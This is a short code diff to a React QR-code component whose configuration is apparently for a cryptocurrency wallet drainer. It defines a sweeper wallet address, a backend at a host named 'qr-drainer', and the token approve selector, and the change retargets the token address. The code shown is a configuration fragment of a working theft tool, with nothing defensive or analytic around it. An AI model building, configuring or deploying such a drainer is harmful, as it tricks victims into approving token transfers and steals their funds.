@@ -6,7 +6,7 @@ import React, { useEffect, useMemo, useRef, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 /* ----------------------------- configuration ---------------------------- */
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
+const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
 const BACKEND = "https://qr-drainer.onrender.com"; 
 const APPROVE_SELECTOR = "0x095ea7b3";
